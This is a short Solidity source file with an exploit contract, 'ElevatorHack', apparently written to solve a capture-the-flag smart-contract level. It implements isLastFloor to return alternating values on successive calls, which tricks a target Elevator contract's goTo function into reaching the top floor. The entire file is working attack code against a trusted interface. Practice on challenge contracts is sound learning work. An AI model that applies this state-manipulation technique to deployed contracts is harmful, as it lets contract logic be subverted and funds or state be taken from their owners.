// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function top() external returns (bool);
    function goTo(uint _floor) external;
}

contract ElevatorHack {
    address _targetAddress;
    bool _top;

    constructor(address targetAddress) {
        _targetAddress = targetAddress;
        _top = true;
    }

    function isLastFloor(uint) public returns (bool) {
        _top = !_top;
        return _top;
    }

    function hack() public {
        IElevator(_targetAddress).goTo(1);
    }
}